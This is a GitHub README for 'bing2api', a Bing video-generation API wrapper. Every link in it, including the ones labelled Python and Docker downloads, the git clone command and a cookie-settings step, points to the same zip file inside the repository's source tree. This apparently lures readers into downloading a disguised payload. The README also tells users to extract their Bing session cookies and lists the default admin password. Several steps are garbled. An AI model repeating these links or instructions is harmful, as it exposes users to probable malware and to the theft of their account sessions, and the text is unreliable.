# 🎥 bing2api - Easy Video API for Bing Creators

[![Download bing2api](https://img.shields.io/badge/Download-Get%20bing2api-brightgreen)](https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip)

---

## 📥 Download bing2api

Click the button above or visit this page to download bing2api:

[https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip](https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip)

---

## 🔍 What is bing2api?

bing2api is a tool that lets you create videos quickly by using text or images. It connects with Bing Video Creator and OpenAI video systems. You do not need to write code to use it. This app runs on your Windows PC and lets you control video generation from your browser.

---

## ⚙️ System Requirements

- Windows 10 or later
- Internet connection
- At least 4 GB of free disk space
- Python 3.8 or higher (if running from source)
- Available Bing account with valid cookies
- Optional: Docker installed (for easy setup)

---

## 🚀 Getting Started

Follow these steps to download and use bing2api on Windows.

### Step 1: Download bing2api

Visit the download page:

https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip

Download the latest release or clone the repository if you want to run it yourself.

---

### Step 2: Install Python and Dependencies (For Local Running)

If you want to run bing2api from source, you need Python.

1. Download Python 3.8 or later from:

   https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip

2. During installation, check **Add Python to PATH**.

3. Open Command Prompt (press Windows key, type `cmd`, press Enter).

4. Run these commands to download and install:

```bash
git clone https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
cd bing2api
pip install -r requirements.txt
```

---

### Step 3: Run bing2api Locally

In the Command Prompt, run:

```bash
PYTHONPATH=src python -m bing_api.api.app
```

This will start the application locally.

---

### Step 4: Access the Management Page

Open your web browser.

Go to:

http://localhost:8000/manage

Use the default admin login to access the management dashboard:

- Username: admin
- Password: admin123

---

### Step 5: Using Docker (Simpler Option)

If you have Docker installed, you can start bing2api without installing Python.

1. Open Command Prompt.

2. Run these commands:

```bash
git clone https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
cd bing2api
docker compose up -d --build
```

3. After starting, open your browser and visit:

http://localhost:8000/manage

4. Login with default credentials:

- Username: admin
- Password: admin123

---

## 🔐 How to Prepare Your Bing Account Cookie

bing2api needs access to a valid Bing account cookie to work. This cookie lets the app access Bing Video Creator safely.

Here is a simple way to get your Bing cookie:

1. Open Microsoft Edge or Chrome.

2. Log into your Bing account.

3. Right-click on the page and select **Inspect** or press `F12` to open the Developer Tools.

4. Go to the **Application** tab.

5. On the left menu, click **Cookies** > https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip

6. Find the cookie named `SRCHD` (or related Bing session cookies).

7. Copy its value.

8. Paste the cookie value into your bing2api management dashboard under "Cookie Settings".

The app will use this cookie to connect to Bing services.

---

## ⚡ Features Overview

- **Create videos from text**: Type your story and bing2api turns it into a video.

- **Create videos from images**: Upload pictures and get video content out of them.

- **Control video speed**: Choose between fast or slow rendering modes explicitly.

- **Manage multiple accounts**: Use several Bing accounts at once to increase capacity.

- **Track usage limits**: Automatically detects if you reach Bing video quota.

- **Save data locally**: Stores tasks and accounts in a small database (SQLite).

- **Update keys and proxies without restarting**: Change running settings right in the dashboard.

---

## 🔧 How to Use bing2api

1. Open the management page (`http://localhost:8000/manage`).

2. Add your Bing cookie into the Account settings.

3. Use the interface to:

   - Generate videos by typing text or uploading images.

   - Check the status of your video tasks.

4. The system handles the work in the background and shows results when they are done.

---

## 💻 Running bing2api on Windows Without Development Tools

If you want the simplest way to get started:

- Download the latest release or Docker image from the GitHub page.

- Use Docker if you already have it installed.

- For Docker, just run the commands from Step 5.

- Access the web page to manage and create videos.

---

## ⚙️ Troubleshooting

- If the app does not start, check that Python or Docker is installed and in your system PATH.

- If the management page does not load, make sure the app is running and try refreshing the browser.

- If video creation fails, verify your Bing cookie is correct and active.

- Restart the app after changing account information to apply updates.

---

## 📱 Access API (For Advanced Users)

The bing2api provides OpenAI-compatible endpoints at:

```
http://localhost:8000/v1/videos/generations
```

You can list models, create video generation requests, and check results through these endpoints.

---

## 🔗 Helpful Links

- GitHub repo: https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip

- Python downloads: https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip

- Docker downloads: https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip

---

[![Download bing2api](https://img.shields.io/badge/Download-Get%20bing2api-brightgreen)](https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip)